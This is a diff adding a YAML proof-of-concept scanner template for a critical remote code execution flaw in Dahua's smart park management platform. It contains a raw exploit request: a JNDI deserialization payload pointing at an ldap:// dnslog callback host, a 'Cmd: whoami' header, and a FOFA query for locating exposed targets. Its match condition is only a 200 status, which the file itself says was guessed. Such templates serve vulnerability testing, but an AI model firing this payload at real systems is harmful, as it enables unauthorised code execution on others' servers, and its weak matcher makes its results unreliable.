@@ -1,0 +1,36 @@
+id: poc-oxevv1yg9k68zgxx
+info:
+  name: 大华智慧园区综合管理平台ipms存在远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oxevv1yg9k68zgxx
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oxevv1yg9k68zgxx
+    fofa: app="dahua-智慧园区综合管理平台"
+http:
+- raw:
+  - 'POST /ipms/barpay/pay HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Cmd: whoami
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip
+
+    Content-Length: 104
+
+
+    {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://xxx.dnslog.com", "autoCommit": true}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
